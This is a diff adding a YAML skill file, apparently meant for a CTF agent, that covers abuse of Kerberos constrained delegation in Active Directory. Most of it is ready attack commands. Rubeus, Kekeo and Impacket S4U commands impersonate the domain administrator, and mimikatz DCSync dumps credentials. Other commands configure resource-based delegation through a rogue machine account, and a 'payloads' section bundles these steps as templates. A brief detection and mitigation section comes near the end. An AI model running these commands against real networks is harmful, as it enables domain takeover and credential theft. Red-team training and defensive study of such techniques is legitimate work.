@@ -1,0 +1,364 @@
+name: constrained_delegation_attack
+description: 约束委派攻击 - Kerberos约束委派滥用技术，利用S4U2Self和S4U2Proxy扩展实现服务间认证和权限提升
+version: "2.0"
+author: CTF-Agent Team
+tags: [kerberos, constrained-delegation, s4u, active-directory, privilege-escalation]
+priority: high
+
+# 使用场景
+scenarios:
+  - 约束委派权限利用
+  - S4U2Self/S4U2Proxy攻击
+  - 服务账户权限滥用
+  - 跨服务访问敏感资源
+  - Kerberos委派链攻击
+
+# 核心技术
+techniques:
+  - S4U2Self Abuse: 利用S4U2Self获取任意用户的服务票据
+  - S4U2Proxy Abuse: 利用S4U2Proxy访问委派目标服务
+  - Constrained Delegation Chain: 委派链攻击
+  - Protocol Transition: 协议转换攻击
+  - Service Account Abuse: 服务账户委派滥用
+
+# 工具列表
+tools:
+  - Rubeus: Kerberos攻击工具
+  - Kekeo: Kerberos框架
+  - mimikatz: Kerberos票据操作
+  - PowerView: AD枚举
+  - BloodHound: 委派路径分析
+  - Impacket: Python Kerberos工具
+  - getST.py: Impacket S4U工具
+
+# Kerberos委派基础
+basics:
+  - concept: |
+      # 约束委派概述
+
+      # 什么是约束委派?
+      # - 限制服务只能委派到特定目标服务
+      # - 比无约束委派更安全但仍有风险
+
+      # 约束委派类型:
+      # 1. Kerberos-only: 只能使用Kerberos认证
+      # 2. Protocol Transition: 可以转换非Kerberos认证
+
+      # 关键属性:
+      # - msDS-AllowedToDelegateTo: 允许委派的目标服务列表
+      # - TrustedToAuthForDelegation: 是否允许协议转换
+
+      # S4U扩展:
+      # - S4U2Self: 服务获取任意用户对自己的票据
+      # - S4U2Proxy: 服务使用S4U2Self票据访问目标服务
+
+      # 攻击场景:
+      # 有约束委派的服务账户可以:
+      # 1. 获取任意用户对该服务的票据(S4U2Self)
+      # 2. 使用该票据访问委派目标服务(S4U2Proxy)
+
+  - delegation_types: |
+      # 委派类型对比
+
+      # 无约束委派:
+      # - 用户TGT存储在服务内存中
+      # - 服务可访问任意资源
+      # - 最危险
+
+      # 约束委派(Kerberos-only):
+      # - 只能委派到指定服务
+      # - 必须使用Kerberos认证
+      # - TrustedToAuthForDelegation = False
+
+      # 约束委派(Protocol Transition):
+      # - 可以委派到指定服务
+      # - 可以转换非Kerberos认证
+      # - TrustedToAuthForDelegation = True
+      # - 最适合攻击
+
+      # 资源约束委派:
+      # - 目标资源控制谁可以委派到它
+      # - msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# 信息收集
+reconnaissance:
+  - delegation_enum: |
+      # 约束委派枚举
+
+      # 查找有约束委派的服务账户
+      Get-DomainUser -TrustedToAuth | Select-Object name, msDS-AllowedToDelegateTo
+
+      # 使用PowerView
+      Get-DomainUser -LDAPFilter "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" -Properties msDS-AllowedToDelegateTo
+
+      # 查找允许协议转换的账户
+      Get-DomainUser -LDAPFilter "(&(objectCategory=user)(TrustedToAuthForDelegation=True))"
+
+      # 查找计算机的约束委派
+      Get-DomainComputer -TrustedToAuth | Select-Object name, msDS-AllowedToDelegateTo
+
+      # BloodHound分析
+      # 查找"AllowedToDelegate"边
+
+  - delegation_targets: |
+      # 委派目标分析
+
+      # 获取允许委派的目标
+      Get-DomainUser -Name "svc_account" -Properties msDS-AllowedToDelegateTo
+
+      # 解析SPN目标
+      # 格式: HTTP/webserver.domain.local
+      #       CIFS/dc.domain.local
+      #       LDAP/dc.domain.local
+
+      # 常见高价值目标:
+      # - CIFS/*: 文件共享访问
+      # - LDAP/*: AD查询
+      # - HTTP/*: Web应用访问
+      # - MSSQLSvc/*: SQL数据库
+
+      # 检查目标服务权限
+      Get-DomainComputer -Name "dc$" -Properties servicePrincipalName
+
+# S4U攻击
+s4u_attack:
+  - rubeus_method: |
+      # Rubeus S4U攻击
+
+      # S4U2Self + S4U2Proxy
+
+      # 1. 获取服务账户凭据(密码或Hash)
+      # 假设服务账户: svc_web
+      # 密码: Password123
+      # 或NTLM Hash: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
+
+      # 2. 使用Rubeus执行S4U
+
+      # S4U2Self - 获取administrator对svc_web的票据
+      Rubeus.exe asktgt /user:svc_web /rc4:NTLM_HASH /domain:domain.local
+
+      # 使用获取的TGT执行S4U
+      Rubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:administrator /domain:domain.local /msdsspn:"CIFS/dc.domain.local" /ptt
+
+      # 或一步完成
+      Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:administrator /domain:domain.local /msdsspn:"CIFS/dc.domain.local" /ptt
+
+      # 3. 现在可以访问目标服务
+      dir \\dc.domain.local\C$
+
+  - kekeo_method: |
+      # Kekeo S4U攻击
+
+      # 1. 获取TGT
+      kekeo.exe "tgt::ask /user:svc_web /domain:domain.local /rc4:NTLM_HASH"
+
+      # 2. S4U2Self
+      kekeo.exe "tgs::s4u /tgt:TGT_KIRBI_FILE /user:administrator@domain.local /service:HTTP/svc_web.domain.local"
+
+      # 3. S4U2Proxy
+      kekeo.exe "tgs::s4u /tgt:TGT_KIRBI_FILE /user:administrator@domain.local /service:HTTP/web.domain.local|CIFS/dc.domain.local"
+
+      # 4. 导入票据
+      mimikatz.exe "kerberos::ptt TGS_KIRBI_FILE"
+
+  - impacket_method: |
+      # Impacket getST.py
+
+      # 使用密码
+      python getST.py -spn 'CIFS/dc.domain.local' -impersonate administrator domain.local/svc_web:Password123
+
+      # 使用Hash
+      python getST.py -spn 'CIFS/dc.domain.local' -impersonate administrator -hashes :NTLM_HASH domain.local/svc_web
+
+      # 获取的ccache文件
+      export KRB5CCNAME=administrator.ccache
+
+      # 使用票据
+      python psexec.py -k -no-pass domain.local/administrator@dc.domain.local
+
+# 协议转换攻击
+protocol_transition:
+  - technique: |
+      # 协议转换攻击
+
+      # 当TrustedToAuthForDelegation=True时
+      # 可以从非Kerberos认证转换
+
+      # 这允许:
+      # 1. 不需要用户TGT
+      # 2. 直接生成任意用户票据
+
+      # 检查协议转换权限
+      Get-DomainUser -LDAPFilter "(&(TrustedToAuthForDelegation=True))"
+
+      # 攻击流程相同，但可以:
+      # - 模拟任意用户(包括不存在的外部用户)
+      # - 不需要用户有Kerberos认证
+
+      # Rubeus攻击
+      Rubeus.exe s4u /user:svc_account /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:"LDAP/dc.domain.local" /ptt
+
+# 常见攻击场景
+attack_scenarios:
+  - web_to_cifs: |
+      # Web服务到CIFS
+
+      # 假设: svc_web有到CIFS/dc的委派
+
+      # 获取administrator访问文件共享的票据
+      Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:"CIFS/dc.domain.local" /ptt
+
+      # 访问文件共享
+      dir \\dc.domain.local\C$
+      copy \\dc.domain.local\C$\secret.txt C:\temp\
+
+  - web_to_ldap: |
+      # Web服务到LDAP
+
+      # 获取administrator访问LDAP的票据
+      Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:"LDAP/dc.domain.local" /ptt
+
+      # 使用LDAP访问
+      # 可以执行DCSync等操作
+
+      mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"
+
+  - sql_to_cifs: |
+      # SQL服务到CIFS
+
+      # MSSQL服务账户可能有文件共享委派
+      Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:"CIFS/fileserver.domain.local" /ptt
+
+# 委派链攻击
+delegation_chain:
+  - technique: |
+      # 委派链攻击
+
+      # 如果存在多个委派关系:
+      # A -> B -> C
+
+      # 可以逐级委派
+
+      # 例如:
+      # svc_web -> HTTP/appserver
+      # appserver -> CIFS/dc
+
+      # 攻击流程:
+      # 1. 使用svc_web委派到HTTP/appserver(模拟administrator)
+      # 2. 使用appserver委派到CIFS/dc(模拟administrator)
+
+      # Rubeus链式攻击
+      # 第一步
+      Rubeus.exe s4u /user:svc_web /rc4:HASH1 /impersonateuser:administrator /msdsspn:"HTTP/appserver.domain.local" /ptt
+
+      # 第二步(如果在appserver上有委派权限)
+      Rubeus.exe s4u /user:appserver$ /rc4:HASH2 /impersonateuser:administrator /msdsspn:"CIFS/dc.domain.local" /ptt
+
+# 资源约束委派
+resource_based_delegation:
+  - technique: |
+      # 资源约束委派
+
+      # 目标资源控制谁可以委派到它
+
+      # 属性: msDS-AllowedToActOnBehalfOfOtherIdentity
+
+      # 检查资源约束委派
+      Get-DomainComputer -Name "target$" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+      # 如果有对目标计算机的WriteDACL权限
+      # 可以添加资源约束委派
+
+      # 创建新计算机账户
+      New-MachineAccount -MachineName "evilpc" -Password "Password123"
+
+      # 配置资源约束委派
+      Set-DomainObject -Identity "target$" -Set @{msDS-AllowedToActOnBehalfOfOtherIdentity="(A;;CCDC;;;evilpc$)"}
+
+      # 使用S4U攻击
+      Rubeus.exe s4u /user:evilpc$ /rc4:HASH /impersonateuser:administrator /msdsspn:"CIFS/target.domain.local" /ptt
+
+# 检测和防御
+defense:
+  - detection: |
+      # 检测约束委派攻击
+
+      # 1. 监控异常的S4U请求
+      # Kerberos事件日志
+
+      # 2. 监控委派配置变更
+      Get-WinEvent -FilterHashtable @{
+        LogName='Security'
+        ID=4738,4742
+      } | Where-Object {
+        $_.Message -match "AllowedToDelegate"
+      }
+
+      # 3. 监控服务账户使用
+
+      # 4. 审计委派关系
+
+      # 5. 使用BloodHound定期分析
+
+  - mitigation: |
+      # 缓解措施
+
+      # 1. 减少约束委派配置
+
+      # 2. 使用资源约束委派替代
+
+      # 3. 审查服务账户权限
+
+      # 4. 禁用协议转换(除非必要)
+
+      # 5. 监控S4U使用
+
+      # 6. 使用组托管服务账户(gMSA)
+
+# 完整攻击流程
+attack_chain:
+  - step1: "枚举约束委派配置"
+  - step2: "获取服务账户凭据"
+  - step3: "识别委派目标服务"
+  - step4: "执行S4U2Self获取票据"
+  - step5: "执行S4U2Proxy访问目标"
+  - step6: "导入票据并访问资源"
+
+# Payload模板
+payloads:
+  - name: "约束委派攻击Payload"
+    template: |
+      # 约束委派攻击Payload
+
+      # 假设svc_web有到CIFS/dc的委派
+
+      # 使用Rubeus
+      Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:administrator /domain:domain.local /msdsspn:"CIFS/dc.domain.local" /ptt
+
+      # 访问目标
+      dir \\dc.domain.local\C$
+      mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"
+
+  - name: "Impacket约束委派Payload"
+    template: |
+      # Impacket约束委派Payload
+
+      # 获取票据
+      python getST.py -spn 'CIFS/dc.domain.local' -impersonate administrator domain.local/svc_web:Password123
+
+      # 设置环境变量
+      export KRB5CCNAME=administrator.ccache
+
+      # 使用票据访问
+      python psexec.py -k -no-pass domain.local/administrator@dc.domain.local
+
+      # 或使用wmiexec
+      python wmiexec.py -k -no-pass domain.local/administrator@dc.domain.local
+
+# 参考资源
+references:
+  - https://github.com/GhostPack/Rubeus
+  - https://github.com/gentilkiwi/kekeo
+  - https://github.com/SecureAuthCorp/impacket
+  - https://adsecurity.org/?p=1667
+  - https://www.harmj0y.net/blog/activedirectory/abusing-kerberos-delegation/
